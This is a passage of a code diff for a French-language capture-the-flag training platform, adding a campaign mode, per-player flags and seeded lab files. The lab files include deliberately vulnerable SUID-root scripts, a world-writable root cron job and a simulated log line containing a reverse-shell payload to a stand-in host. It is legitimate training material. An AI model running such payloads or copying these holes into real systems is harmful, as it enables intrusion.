@@ -95,6 +95,20 @@ class TrainingManager {
         ip_address TEXT,
         timestamp TEXT
       );
+      CREATE TABLE IF NOT EXISTS training_campaign_progress (
+        player_id TEXT,
+        box_id TEXT,
+        act INTEGER,
+        offensive_status TEXT DEFAULT 'not_started',
+        soc_investigation_status TEXT DEFAULT 'pending',
+        detection_status TEXT DEFAULT 'pending',
+        remediation_status TEXT DEFAULT 'pending',
+        artifacts_unlocked TEXT DEFAULT '[]',
+        points_earned INTEGER DEFAULT 0,
+        completed_at TEXT,
+        updated_at TEXT,
+        PRIMARY KEY (player_id, box_id)
+      );
     `);
 
     // Migration transparente des colonnes pour bases existantes
@@ -105,7 +119,16 @@ class TrainingManager {
       'cve TEXT',
       'rating REAL DEFAULT 4.9',
       'solves INTEGER DEFAULT 1200',
-      'monogram TEXT'
+      'monogram TEXT',
+      'act INTEGER DEFAULT 0',
+      'season INTEGER DEFAULT 1',
+      'mitre_tags TEXT DEFAULT "[]"',
+      'owasp_tags TEXT DEFAULT "[]"',
+      'mission_order TEXT',
+      'rules_of_engagement TEXT',
+      'debrief_json TEXT DEFAULT "{}"',
+      'defense_json TEXT DEFAULT "{}"',
+      'artifacts_json TEXT DEFAULT "[]"'
     ];
     for (const col of extraCols) {
       try {
@@ -118,18 +141,37 @@ class TrainingManager {
     this.seedLearningPaths();
   }
 
-  // 2. Génération de Flag Dynamique unique par joueur (Anti-Triche)
-  generateDynamicFlag(challengeId, canonicalFlag, playerNickname = 'Opérateur RedTeam') {
+  // 2. Génération de Flag Dynamique unique par joueur (Anti-Triche HMAC-SHA256)
+  generateDynamicFlag(challengeId, taskIdOrCanonical, canonicalOrPlayer, maybePlayer) {
+    let taskId = 't1';
+    let canonicalFlag = '';
+    let playerId = 'current_player';
+
+    if (maybePlayer !== undefined) {
+      taskId = taskIdOrCanonical || 't1';
+      canonicalFlag = canonicalOrPlayer || '';
+      playerId = maybePlayer || 'current_player';
+    } else if (typeof canonicalOrPlayer === 'string' && (canonicalOrPlayer.startsWith('CYBER') || canonicalOrPlayer.startsWith('AEGIS') || canonicalOrPlayer.startsWith('FLAG') || canonicalOrPlayer.startsWith('KEY') || canonicalOrPlayer.startsWith('SIGMA') || canonicalOrPlayer.startsWith('YARA') || canonicalOrPlayer.startsWith('REMEDIATION') || canonicalOrPlayer.includes('{'))) {
+      taskId = taskIdOrCanonical || 't1';
+      canonicalFlag = canonicalOrPlayer;
+      playerId = 'current_player';
+    } else {
+      canonicalFlag = taskIdOrCanonical || '';
+      playerId = canonicalOrPlayer || 'current_player';
+      taskId = 't1';
+    }
+
     if (!canonicalFlag) return 'CYBERLAB{DEFAULT_FLAG}';
     
-    // Si le flag est déjà au format CYBERLAB{...}, on dérive une signature unique
-    const cleanNick = (playerNickname || 'Player').toLowerCase().trim();
+    const cleanPlayer = (playerId || 'current_player').toLowerCase().trim();
+    const cleanChallenge = (challengeId || '').toLowerCase().trim();
+    const cleanTask = (taskId || '').toLowerCase().trim();
+
     const hash = crypto.createHmac('sha256', HMAC_SECRET)
-      .update(`${challengeId}:${cleanNick}`)
+      .update(`${cleanChallenge}:${cleanTask}:${cleanPlayer}`)
       .digest('hex')
       .slice(0, 8);
 
-    // Extraction du préfixe signifiant
     const match = canonicalFlag.match(/^([A-Z0-9_]+)\{([\s\S]+)\}$/);
     if (match) {
       const prefix = match[1];
@@ -172,8 +214,9 @@ class TrainingManager {
             INSERT INTO training_challenges (
               id, title, category, difficulty, points, duration_min, learning_path, author,
               tags, prerequisites, recommended_tools, narrative_story, tasks_json, hints_json,
-              writeup_markdown, target_port, virtual_ip, target_os, machine_type, organization, cve, rating, solves, monogram, created_at
-            ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
+              writeup_markdown, target_port, virtual_ip, target_os, machine_type, organization, cve, rating, solves, monogram,
+              act, season, mitre_tags, owasp_tags, mission_order, rules_of_engagement, debrief_json, defense_json, artifacts_json, created_at
+            ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
             ON CONFLICT(id) DO UPDATE SET
               title = excluded.title,
               category = excluded.category,
@@ -197,7 +240,16 @@ class TrainingManager {
               cve = excluded.cve,
               rating = excluded.rating,
               solves = excluded.solves,
-              monogram = excluded.monogram
+              monogram = excluded.monogram,
+              act = excluded.act,
+              season = excluded.season,
+              mitre_tags = excluded.mitre_tags,
+              owasp_tags = excluded.owasp_tags,
+              mission_order = excluded.mission_order,
+              rules_of_engagement = excluded.rules_of_engagement,
+              debrief_json = excluded.debrief_json,
+              defense_json = excluded.defense_json,
+              artifacts_json = excluded.artifacts_json
           `);
 
           stmt.run(
@@ -225,6 +277,15 @@ class TrainingManager {
             meta.rating || 4.9,
             meta.solves || 1200,
             meta.monogram || (meta.id || chId).substring(0, 4).toUpperCase(),
+            meta.act || 0,
+            meta.season || 1,
+            JSON.stringify(meta.mitre_tags || []),
+            JSON.stringify(meta.owasp_tags || []),
+            meta.mission_order || '',
+            meta.rules_of_engagement || '',
+            JSON.stringify(meta.debrief_json || {}),
+            JSON.stringify(meta.defense_tasks || {}),
+            JSON.stringify(meta.artifacts_discovered || []),
             new Date().toISOString()
           );
         } catch (e) {
@@ -389,7 +450,16 @@ class TrainingManager {
         cve: r.cve || null,
         rating: r.rating || 4.9,
         solves: r.solves || 1200,
-        monogram: r.monogram || r.id.substring(0, 4).toUpperCase()
+        monogram: r.monogram || r.id.substring(0, 4).toUpperCase(),
+        act: r.act || 0,
+        season: r.season || 1,
+        mitre_tags: JSON.parse(r.mitre_tags || '[]'),
+        owasp_tags: JSON.parse(r.owasp_tags || '[]'),
+        mission_order: r.mission_order || '',
+        rules_of_engagement: r.rules_of_engagement || '',
+        debrief: JSON.parse(r.debrief_json || '{}'),
+        defense_tasks: JSON.parse(r.defense_json || '{}'),
+        artifacts: JSON.parse(r.artifacts_json || '[]')
       };
     });
   }
@@ -420,7 +490,8 @@ class TrainingManager {
       points: t.points || 0,
       is_completed: completedTasks.has(t.id),
       requires_flag: !!t.flag || !!t.canonical_flag,
-      task_type: t.task_type || 'flag'
+      task_type: t.task_type || 'flag',
+      is_defense: t.id === 't4' || t.id === 't5' || t.id === 't6'
     }));
 
     // Masquage du texte des indices non débloqués
@@ -483,7 +554,18 @@ class TrainingManager {
       cve: ch.cve || null,
       rating: ch.rating || 4.9,
       solves: ch.solves || 1200,
-      monogram: ch.monogram || ch.id.substring(0, 4).toUpperCase()
+      monogram: ch.monogram || ch.id.substring(0, 4).toUpperCase(),
+      act: ch.act || 0,
+      season: ch.season || 1,
+      mitre_tags: JSON.parse(ch.mitre_tags || '[]'),
+      owasp_tags: JSON.parse(ch.owasp_tags || '[]'),
+      mission_order: ch.mission_order || '',
+      rules_of_engagement: ch.rules_of_engagement || '',
+      debrief: JSON.parse(ch.debrief_json || '{}'),
+      debrief_json: JSON.parse(ch.debrief_json || '{}'),
+      defense_tasks: JSON.parse(ch.defense_json || '{}'),
+      defense_json: JSON.parse(ch.defense_json || '{}'),
+      artifacts: JSON.parse(ch.artifacts_json || '[]')
     };
   }
 
@@ -519,7 +601,8 @@ class TrainingManager {
       assigned_port: assignedPort,
       started_at: startedAt,
       expires_at: expiresAt,
-      status: 'running'
+      status: 'running',
+      vfs_injection: this.getChallengeVfsSnapshot(challengeId, 'current_player')
     };
 
     // Sauvegarde en base et cache mémoire
@@ -584,12 +667,164 @@ class TrainingManager {
       started_at: row.started_at,
       expires_at: row.expires_at,
       remaining_seconds: remainingSeconds,
-      status: 'running'
+      status: 'running',
+      vfs_injection: this.getChallengeVfsSnapshot(challengeId, 'current_player')
     };
   }
 
-  // 8. Soumission et validation de flag (avec support canonique et dynamique)
-  submitFlag(challengeId, taskId, submittedFlag, playerNickname = 'Opérateur RedTeam', ipAddress = '127.0.0.1') {
+  // 7.1 Snapshot VFS avec injection dynamique des drapeaux par joueur
+  getChallengeVfsSnapshot(challengeId, playerId = 'current_player') {
+    const ch = this.db.prepare('SELECT * FROM training_challenges WHERE id = ?').get(challengeId);
+    if (!ch) return {};
+
+    const files = {};
+    const tasks = JSON.parse(ch.tasks_json || '[]');
+
+    const userTask = tasks.find(t => t.id === 't2' || (t.title || '').toLowerCase().includes('user')) || tasks[0];
+    const rootTask = tasks.find(t => t.id === 't3' || (t.title || '').toLowerCase().includes('root')) || tasks[1];
+
+    const userCanon = userTask ? (userTask.flag || userTask.canonical_flag || 'FLAG{USER}') : 'FLAG{USER}';
+    const rootCanon = rootTask ? (rootTask.flag || rootTask.canonical_flag || 'FLAG{ROOT}') : 'FLAG{ROOT}';
+
+    const userFlag = this.generateDynamicFlag(challengeId, userTask ? userTask.id : 't2', userCanon, playerId);
+    const rootFlag = this.generateDynamicFlag(challengeId, rootTask ? rootTask.id : 't3', rootCanon, playerId);
+
+    // Flags dynamiques standard
+    files['/home/operator/user.txt'] = {
+      content: userFlag + '\n',
+      permissions: '0644',
+      owner: 'operator',
+      group: 'operator'
+    };
+
+    files['/root/root.txt'] = {
+      content: rootFlag + '\n',
+      permissions: '0600',
+      owner: 'root',
+      group: 'root'
+    };
+
+    files['/root/flag.txt'] = {
+      content: rootFlag + '\n',
+      permissions: '0600',
+      owner: 'root',
+      group: 'root'
+    };
+
+    // Injections narratives spécifiques aux boxes de la Saison 1
+    if (challengeId === 'aegis-box-01-perimeter') {
+      files['/home/operator/gatekeeper_config.json'] = {
+        content: JSON.stringify({
+          service: 'Gatekeeper Telemetry Gateway',
+          version: '2.4.1',
+          internal_pivot_target: '10.10.10.60 (core-nexus.internal.aegis)',
+          auth_endpoint: '/portal/api/exchange',
+          status: 'compromised_by_chimera'
+        }, null, 2),
+        permissions: '0644',
+        owner: 'operator',
+        group: 'operator'
+      };
+
+      files['/usr/local/bin/aegis-sync'] = {
+        content: '#!/bin/bash\n# Aegis Gatekeeper Telemetry Sync Daemon (SUID root)\nif [ -f /tmp/sync_hook ]; then\n  /bin/sh /tmp/sync_hook\nfi\necho "[AEGIS-SYNC] Synchronisation des certificats de passerelle terminee."\n',
+        permissions: '4755',
+        owner: 'root',
+        group: 'root',
+        suid: true
+      };
+
+      files['/var/log/nginx/access.log'] = {
+        content: '198.51.100.42 - - [27/Oct/2026:03:14:22 +0000] "POST /portal/api/exchange HTTP/1.1" 200 412 "curl/8.2.1" "PAYLOAD:\';/bin/bash -i >& /dev/tcp/198.51.100.42/4444 0>&1;\'"\n198.51.100.42 - - [27/Oct/2026:03:15:01 +0000] "GET /portal/api/status HTTP/1.1" 200 89 "-" "Chimera-Scanner/1.0"\n',
+        permissions: '0644',
+        owner: 'root',
+        group: 'root'
+      };
+
+      files['/var/log/auth.log'] = {
+        content: 'Oct 27 03:14:30 gatekeeper sudo[1420]: operator : COMMAND=/usr/local/bin/aegis-sync\nOct 27 03:15:12 gatekeeper sshd[1455]: Accepted publickey for operator from 198.51.100.42\n',
+        permissions: '0644',
+        owner: 'root',
+        group: 'root'
+      };
+    } else if (challengeId === 'aegis-box-02-internal') {
+      files['/home/operator/nexus_auth.sql'] = {
+        content: '-- Aegis Core Nexus Database Dump\n-- Note RSSI : VAULT_CIPHER_KEY_AEGIS_99\nINSERT INTO accounts VALUES (1, "viktor.k", "V!kt0r_Ch1m3ra_P4ss#2026");\n',
+        permissions: '0644',
+        owner: 'operator',
+        group: 'operator'
+      };
+
+      files['/opt/maintenance/aegis-backup.sh'] = {
+        content: '#!/bin/bash\n# Aegis Automated Backup Script\ntar -czf /tmp/backup_core.tar.gz /etc/aegis 2>/dev/null\n',
+        permissions: '0777',
+        owner: 'root',
+        group: 'root'
+      };
+
+      files['/etc/cron.d/aegis-backup'] = {
+        content: '*/5 * * * * root /opt/maintenance/aegis-backup.sh\n',
+        permissions: '0644',
+        owner: 'root',
+        group: 'root'
+      };
+
+      files['/var/log/syslog'] = {
+        content: 'Oct 28 14:20:00 core-nexus CRON[2891]: (root) CMD (/opt/maintenance/aegis-backup.sh)\nOct 28 14:23:45 core-nexus logger[2940]: ALERT: Chimera implant persistence detected in /tmp/chimera_implant_cron.sh\n',
+        permissions: '0644',
+        owner: 'root',
+        group: 'root'
+      };
+
+      files['/var/log/audit/audit.log'] = {
+        content: 'type=EXECVE msg=audit(1761661425.890:421): argc=3 a0="python3" a1="-c" a2="import os; os.setuid(0); os.system(\'/bin/sh\')"\n',
+        permissions: '0644',
+        owner: 'root',
+        group: 'root'
+      };
+    } else if (challengeId === 'aegis-box-03-vault') {
+      files['/opt/telemetry/shadow_dropper'] = {
+        content: 'CHIMERA_IMPLANT_V1_AUTONOMOUS_EXFILTRATION_PAYLOAD_DEST_BEACON_ALPHA_CHIMERA_APT_NET_PORT_9443\n',
+        permissions: '0755',
+        owner: 'root',
+        group: 'root'
+      };
+
+      files['/usr/bin/aegis-vault-ctl'] = {
+        content: '#!/bin/bash\n# Aegis Vault Orchestration Control CLI\nif [ "$1" = "override" ]; then\n  /bin/sh\nelse\n  echo "Usage: aegis-vault-ctl [status|verify|override]"\nfi\n',
+        permissions: '4755',
+        owner: 'root',
+        group: 'root',
+        suid: true
+      };
+
+      files['/var/log/suricata/eve.json'] = {
+        content: '{"timestamp":"2026-10-29T21:40:12.890123","event_type":"alert","src_ip":"10.10.10.70","src_port":49152,"dest_ip":"198.51.100.99","dest_port":9443,"proto":"TCP","alert":{"action":"allowed","signature":"ET MALWARE Chimera APT C2 Beacon Outbound","category":"A Network Trojan was detected"},"dns":{"query":[{"name":"beacon-alpha.chimera-apt.net","type":"A"}]}}\n',
+        permissions: '0644',
+        owner: 'root',
+        group: 'root'
+      };
+
+      files['/var/log/chimera_c2.log'] = {
+        content: '[2026-10-29 21:40:15] BEACON ACTIVE: Destination c2.chimera-apt.onion.mesh (alias beacon-alpha.chimera-apt.net) on port 9443\n',
+        permissions: '0644',
+        owner: 'root',
+        group: 'root'
+      };
+
+      files['/etc/iptables.rules'] = {
+        content: '*filter\n:INPUT ACCEPT [0:0]\n:FORWARD ACCEPT [0:0]\n:OUTPUT ACCEPT [0:0]\nCOMMIT\n',
+        permissions: '0644',
+        owner: 'root',
+        group: 'root'
+      };
+    }
+
+    return files;
+  }
+
+  // 8. Soumission et validation de flag (Anti-Triche Strict HMAC & Multi-Étapes)
+  submitFlag(challengeId, taskId, submittedFlag, playerNickname = 'Opérateur RedTeam', ipAddress = '127.0.0.1', explicitPlayerId = null) {
     const ch = this.db.prepare('SELECT * FROM training_challenges WHERE id = ?').get(challengeId);
     if (!ch) throw new Error('Challenge introuvable.');
 
@@ -599,15 +834,48 @@ class TrainingManager {
 
     const cleanSubmitted = (submittedFlag || '').trim();
     const canonicalFlag = (task.flag || task.canonical_flag || '').trim();
-    const dynamicFlag = this.generateDynamicFlag(challengeId, canonicalFlag, playerNickname);
 
-    // Vérification de validité (support du flag canonique ou du flag dynamique de joueur)
-    const isCorrect = canonicalFlag && (
-      cleanSubmitted === canonicalFlag ||
-      cleanSubmitted === dynamicFlag ||
-      cleanSubmitted.toLowerCase() === canonicalFlag.toLowerCase() ||
-      cleanSubmitted.toLowerCase() === dynamicFlag.toLowerCase()
-    );
+    // Récupération de l'ID du joueur
+    const user = this.db.prepare('SELECT id, nickname FROM user_state WHERE id = ?').get('current_player') || { id: 'current_player', nickname: playerNickname };
+    const playerId = explicitPlayerId || (playerNickname && playerNickname !== 'Opérateur RedTeam' && !playerNickname.includes(' ') ? playerNickname : (user.id || 'current_player'));
+
+    const dynamicFlag = this.generateDynamicFlag(challengeId, taskId, canonicalFlag, playerId);
+    const isCampaign = (ch.category === 'campaign' || ch.category === 'Campaign' || ch.id.startsWith('aegis-box-'));
+
+    let isCorrect = false;
+    let customErrorMsg = null;
+
+    if (isCampaign) {
+      // Détection des tâches à flags dynamiques (User Flag & Root Flag)
+      const isDynamicFlagTask = (canonicalFlag.startsWith('AEGIS{') || canonicalFlag.startsWith('CHIMERA{') || canonicalFlag.startsWith('FLAG{'));
+
+      if (isDynamicFlagTask) {
+        if (cleanSubmitted === dynamicFlag || cleanSubmitted.toLowerCase() === dynamicFlag.toLowerCase()) {
+          isCorrect = true;
+        } else if (cleanSubmitted === canonicalFlag || cleanSubmitted.toLowerCase() === canonicalFlag.toLowerCase()) {
+          // Rejet formel du flag statique copié (anti-triche writeup)
+          isCorrect = false;
+          customErrorMsg = '❌ Flag statique refusé ! Le mode Campagne utilise des flags dynamiques calculés pour ton identité d\'opérateur. Explore la cible pour extraire ton flag personnel.';
+        } else {
+          isCorrect = false;
+          customErrorMsg = 'Drapeau incorrect pour ton profil opérateur. Vérifie ta capture ou ton shell.';
+        }
+      } else {
+        // Tâches SOC, Détection ou Remédiation (réponses de texte ou tokens de règles)
+        if (cleanSubmitted === canonicalFlag || cleanSubmitted.toLowerCase() === canonicalFlag.toLowerCase() ||
+            cleanSubmitted === dynamicFlag || cleanSubmitted.toLowerCase() === dynamicFlag.toLowerCase()) {
+          isCorrect = true;
+        }
+      }
+    } else {
+      // Pour les 123 challenges classiques, rétro-compatibilité totale
+      isCorrect = canonicalFlag && (
+        cleanSubmitted === canonicalFlag ||
+        cleanSubmitted === dynamicFlag ||
+        cleanSubmitted.toLowerCase() === canonicalFlag.toLowerCase() ||
+        cleanSubmitted.toLowerCase() === dynamicFlag.toLowerCase()
+      );
+    }
 
     // Journalisation de la soumission
     this.db.prepare(`
@@ -673,6 +941,34 @@ class TrainingManager {
         new Date().toISOString()
       );
 
+      // Mise à jour de la table de campagne dédiée
+      if (isCampaign) {
+        let camp = this.db.prepare('SELECT * FROM training_campaign_progress WHERE player_id = ? AND box_id = ?').get(playerId, challengeId);
+        let offStatus = camp ? camp.offensive_status : 'not_started';
+        let socStatus = camp ? camp.soc_investigation_status : 'pending';
+        let detStatus = camp ? camp.detection_status : 'pending';
+        let remStatus = camp ? camp.remediation_status : 'pending';
+
+        if (completedTasks.has('t3')) offStatus = 'root_pwned';
+        else if (completedTasks.has('t2')) offStatus = 'user_pwned';
+
+        if (completedTasks.has('t4')) socStatus = 'completed';
+        if (completedTasks.has('t5')) detStatus = 'completed';
+        if (completedTasks.has('t6')) remStatus = 'completed';
+
+        this.db.prepare(`
+          INSERT INTO training_campaign_progress (player_id, box_id, act, offensive_status, soc_investigation_status, detection_status, remediation_status, points_earned, updated_at)
+          VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
+          ON CONFLICT(player_id, box_id) DO UPDATE SET
+            offensive_status = excluded.offensive_status,
+            soc_investigation_status = excluded.soc_investigation_status,
+            detection_status = excluded.detection_status,
+            remediation_status = excluded.remediation_status,
+            points_earned = training_campaign_progress.points_earned + excluded.points_earned,
+            updated_at = excluded.updated_at
+        `).run(playerId, challengeId, ch.act || 1, offStatus, socStatus, detStatus, remStatus, pointsAwarded, new Date().toISOString());
+      }
+
       // Créditer l'XP au profil général du joueur dans user_state
       if (pointsAwarded > 0) {
         this.db.prepare(`
@@ -683,13 +979,15 @@ class TrainingManager {
       }
 
       return {
+        success: true,
         is_correct: true,
+        correct: true,
         task_id: taskId,
         points_awarded: pointsAwarded,
         challenge_completed: allSolved,
         message: allSolved
-          ? '🎉 Félicitations ! Tu as complété toutes les tâches et capturé l\'infrastructure !'
-          : '✔ Drapeau validé avec succès ! Poursuis la mission.'
+          ? '🎉 Félicitations ! Tu as complété toutes les tâches et sécurisé l\'infrastructure !'
+          : '✔ Objectif validé avec succès ! Poursuis la mission.'
       };
     } else {
       // Échec : incrémentation des tentatives
@@ -702,11 +1000,405 @@ class TrainingManager {
       `).run(challengeId, new Date().toISOString());
 
       return {
+        success: false,
         is_correct: false,
+        correct: false,
         task_id: taskId,
-        message: 'Drapeau incorrect. Analyse les données recueillies et réessaie.'
+        message: customErrorMsg || 'Drapeau incorrect. Analyse les données recueillies et réessaie.',
+        error: customErrorMsg || 'Drapeau incorrect. Analyse les données recueillies et réessaie.'
       };
     }
+  }
+
+  // 8.1 API Mode Campagne Saison 1 "Opération Aegis & Chimera"
+  getCampaignSeason(seasonNum = 1, playerId = 'current_player') {
+    const boxes = this.db.prepare(`
+      SELECT * FROM training_challenges 
+      WHERE category = 'campaign' OR category = 'Campaign' OR id LIKE 'aegis-box-%'
+      ORDER BY act ASC, id ASC
+    `).all();
+
+    const progressList = this.db.prepare('SELECT * FROM training_user_progress').all();
+    const campList = this.db.prepare('SELECT * FROM training_campaign_progress WHERE player_id = ?').all(playerId);
+    const progMap = new Map();
+    progressList.forEach(p => progMap.set(p.challenge_id, p));
+    const campMap = new Map();
+    campList.forEach(c => campMap.set(c.box_id, c));
+
+    let totalOffensivePoints = 0;
+    let earnedOffensivePoints = 0;
+    let totalDefensivePoints = 0;
+    let earnedDefensivePoints = 0;
+
+    const acts = [
+      {
+        act: 1,
+        title: 'Acte I : Brèche Périmétrique',
+        subtitle: 'Reconnaissance DMZ, exploitation de portail et tête de pont dormante',
+        boxes: []
+      },
+      {
+        act: 2,
+        title: 'Acte II : Pivot & Escalade Interne',
+        subtitle: 'Exploitation d\'artefacts, pivot sur Core Nexus et persistance cron',
+        boxes: []
+      },
+      {
+        act: 3,
+        title: 'Acte III : Contrôle & Exfiltration',
+        subtitle: 'Infiltration du Shadow Vault, neutralisation C2 et scellement final',
+        boxes: []
+      }
+    ];
+
+    boxes.forEach(b => {
+      const prog = progMap.get(b.id) || { status: 'not_started', tasks_completed: '[]', points_earned: 0 };
+      const camp = campMap.get(b.id) || {
+        offensive_status: 'not_started',
+        soc_investigation_status: 'pending',
+        detection_status: 'pending',
+        remediation_status: 'pending'
+      };
+      const completedTasks = new Set(JSON.parse(prog.tasks_completed || '[]'));
+      const tasks = JSON.parse(b.tasks_json || '[]');
+
+      tasks.forEach(t => {
+        const isDef = t.id === 't4' || t.id === 't5' || t.id === 't6';
+        const pts = t.points || 0;
+        if (isDef) {
+          totalDefensivePoints += pts;
+          if (completedTasks.has(t.id)) earnedDefensivePoints += pts;
+        } else {
+          totalOffensivePoints += pts;
+          if (completedTasks.has(t.id)) earnedOffensivePoints += pts;
+        }
+      });
+
+      const isUserDone = completedTasks.has('t2');
+      const isRootDone = completedTasks.has('t3');
+      const isSocDone = completedTasks.has('t4');
+      const isDetDone = completedTasks.has('t5');
+      const isRemDone = completedTasks.has('t6');
+
+      const offStatus = isRootDone ? 'root_pwned' : (isUserDone ? 'user_pwned' : 'not_started');
+      const defStatus = (isSocDone && isDetDone && isRemDone) ? 'fully_secured' : (
+        (isSocDone && isDetDone) ? 'detection_validated' : (
+          isSocDone ? 'soc_investigated' : 'pending'
+        )
+      );
+
+      const offenseCompletedCount = ['t1', 't2', 't3'].filter(id => completedTasks.has(id)).length;
+      const defenseCompletedCount = ['t4', 't5', 't6'].filter(id => completedTasks.has(id)).length;
+      const isBoxCompleted = (offenseCompletedCount === 3 && defenseCompletedCount === 3);
+
+      const boxData = {
+        id: b.id,
+        title: b.title,
+        act: b.act || 1,
+        difficulty: b.difficulty,
+        points: b.points,
+        duration_min: b.duration_min,
+        organization: b.organization,
+        description: b.narrative_story || b.title,
+        narrative_story: b.narrative_story,
+        virtual_ip: b.virtual_ip || '10.10.10.50',
+        target_port: b.target_port || 80,
+        offensive_status: offStatus,
+        defensive_status: defStatus,
+        is_completed: isBoxCompleted,
+        offense_completed: offenseCompletedCount,
+        defense_completed: defenseCompletedCount,
+        tasks_completed: [...completedTasks],
+        total_tasks: tasks.length,
+        artifacts_discovered: JSON.parse(b.artifacts_json || '[]'),
+        mitre_tags: JSON.parse(b.mitre_tags || '[]'),
+        owasp_tags: JSON.parse(b.owasp_tags || '[]'),
+        defense_tasks: JSON.parse(b.defense_json || '{}'),
+        debrief: JSON.parse(b.debrief_json || '{}')
+      };
+
+      const targetAct = acts.find(a => a.act === (b.act || 1)) || acts[0];
+      targetAct.boxes.push(boxData);
+    });
+
+    const allCampaignBoxes = acts.flatMap(a => a.boxes);
+    const totalTasksCount = allCampaignBoxes.reduce((acc, b) => acc + (b.total_tasks || 6), 0);
+    const offenseTasksCount = allCampaignBoxes.length * 3;
+    const defenseTasksCount = allCampaignBoxes.length * 3;
+    const earnedOffenseTasksCount = allCampaignBoxes.reduce((acc, b) => acc + (b.offense_completed || 0), 0);
+    const earnedDefenseTasksCount = allCampaignBoxes.reduce((acc, b) => acc + (b.defense_completed || 0), 0);
+
+    return {
+      season: {
+        number: seasonNum,
+        name: 'Opération Aegis & Chimera',
+        synopsis: 'Aegis Defense Systems mandate votre cellule d\'opérateurs pour un test d\'intrusion périmétrique. Au cours de la mission, vous décelez les traces d\'un groupe APT rival (Chimera) et devez remonter la chaîne de compromission, neutraliser leur implant central et durcir les défenses.'
+      },
+      title: 'Saison 1 : Opération Aegis & Chimera',
+      synopsis: 'Aegis Defense Systems mandate votre cellule d\'opérateurs pour un test d\'intrusion périmétrique. Au cours de la mission, vous décelez les traces d\'un groupe APT rival (Chimera) et devez remonter la chaîne de compromission, neutraliser leur implant central et durcir les défenses.',
+      characters: [
+        { name: 'Elena Vance', role: 'Directrice RSSI (CISO)', organization: 'Aegis Defense Systems', avatar: '🛡️', quote: 'Nous devons contenir l\'intrusion avant l\'exfiltration du sanctuaire.', description: 'Commande l\'audit de défense et valide les remédiations de sécurité.' },
+        { name: 'Viktor K. (alias NullPhantom)', role: 'Opérateur APT Lead', organization: 'Chimera APT Group', avatar: '🥷', quote: 'Le périmètre n\'était qu\'une diversion. Vos clés nous appartiennent déjà.', description: 'Auteur des implants furtifs et de la chaîne d\'exfiltration.' },
+        { name: 'Marcus Cole', role: 'Lead Sysadmin', organization: 'Aegis Defense Systems', avatar: '⚙️', quote: 'Je n\'aurais jamais dû laisser ce binaire de synchronisation avec le bit SUID...', description: 'Administrateur de Core Nexus et des passerelles d\'infrastructure.' }
+      ],
+      boxes: allCampaignBoxes,
+      stats: {
+        total_boxes: allCampaignBoxes.length,
+        total_tasks: totalTasksCount || 18,
+        offense_tasks: offenseTasksCount || 9,
+        defense_tasks: defenseTasksCount || 9,
+        offense_completed: earnedOffenseTasksCount,
+        defense_completed: earnedDefenseTasksCount,
+        total_offensive_points: totalOffensivePoints,
+        earned_offensive_points: earnedOffensivePoints,
+        offensive_completion_pct: totalOffensivePoints ? Math.round((earnedOffensivePoints / totalOffensivePoints) * 100) : 0,
+        total_defensive_points: totalDefensivePoints,
+        earned_defensive_points: earnedDefensivePoints,
+        defensive_completion_pct: totalDefensivePoints ? Math.round((earnedDefensivePoints / totalDefensivePoints) * 100) : 0
+      },
+      acts: acts
+    };
+  }
+
+  // 8.2 API Défi Quotidien ("Daily Mission")
+  getDailyMission(playerId = 'current_player') {
+    const today = new Date().toISOString().slice(0, 10);
+    let hash = 0;
+    for (let i = 0; i < today.length; i++) {
+      hash = (hash << 5) - hash + today.charCodeAt(i);
+      hash |= 0;
+    }
+
+    const allChallenges = this.db.prepare("SELECT * FROM training_challenges WHERE category != 'campaign'").all();
+    const index = Math.abs(hash) % (allChallenges.length || 1);
+    const picked = allChallenges[index] || allChallenges[0];
+
+    const prog = this.db.prepare('SELECT * FROM training_user_progress WHERE challenge_id = ?').get(picked.id);
+    const isSolved = prog && prog.status === 'solved';
+
+    return {
+      date: today,
+      xp_multiplier: 1.5,
+      challenge: {
+        id: picked.id,
+        title: picked.title,
+        category: picked.category,
+        difficulty: picked.difficulty,
+        points: Math.round(picked.points * 1.5),
+        base_points: picked.points,
+        xp_multiplier: 1.5,
+        duration_min: picked.duration_min,
+        target_os: picked.target_os,
+        organization: picked.organization,
+        is_solved: isSolved
+      },
+      bonus_badge: 'Daily Streak Operator',
+      expires_in_hours: 24 - new Date().getUTCHours()
+    };
+  }
+
+  // 8.3 Vérification de Remédiation & Hardening
+  verifyRemediation(challengeId, remediationType, vfsState = {}, playerId = 'current_player') {
+    let list = [];
+    if (Array.isArray(vfsState)) {
+      list = vfsState;
+    } else if (vfsState && typeof vfsState === 'object') {
+      if (vfsState.path) {
+        list = [vfsState];
+      } else {
+        list = Object.entries(vfsState).map(([k, v]) => ({ path: k, ...(typeof v === 'object' ? v : { content: v }) }));
+      }
+    }
+    const findNode = (targetPath) => list.find(f => f && (f.path === targetPath || (f.path && f.path.endsWith(targetPath))));
+
+    if (challengeId === 'aegis-box-01-perimeter') {
+      const syncNode = findNode('/usr/local/bin/aegis-sync');
+      if (!syncNode) {
+        return {
+          success: false,
+          verified: false,
+          hardened: false,
+          message: 'Fichier /usr/local/bin/aegis-sync introuvable dans l\'état du terminal. Vérifie tes modifications.'
+        };
+      }
+      const stillSuid = syncNode.suid === true || (typeof syncNode.permissions === 'string' && syncNode.permissions.startsWith('4'));
+      if (stillSuid) {
+        return {
+          success: false,
+          verified: false,
+          hardened: false,
+          message: 'Échec du durcissement : le bit SUID (mode 4755) est toujours actif sur /usr/local/bin/aegis-sync. Exécute "chmod 0755 /usr/local/bin/aegis-sync" dans le terminal.'
+        };
+      }
+      const flag = 'REMEDIATION{AEGIS_SYNC_SUID_STRIPPED_SUCCESS}';
+      const sub = this.submitFlag(challengeId, 't6', flag, 'current_player', '127.0.0.1', playerId);
+      return {
+        success: true,
+        verified: true,
+        hardened: true,
+        flag: flag,
+        points_awarded: sub.points_awarded || 30,
+        message: '✔ Bit SUID retiré avec succès sur /usr/local/bin/aegis-sync ! Le durcissement est validé.'
+      };
+    } else if (challengeId === 'aegis-box-02-internal') {
+      const cronNode = findNode('/opt/maintenance/aegis-backup.sh');
+      if (!cronNode) {
+        return {
+          success: false,
+          verified: false,
+          hardened: false,
+          message: 'Script /opt/maintenance/aegis-backup.sh introuvable dans l\'état du terminal.'
+        };
+      }
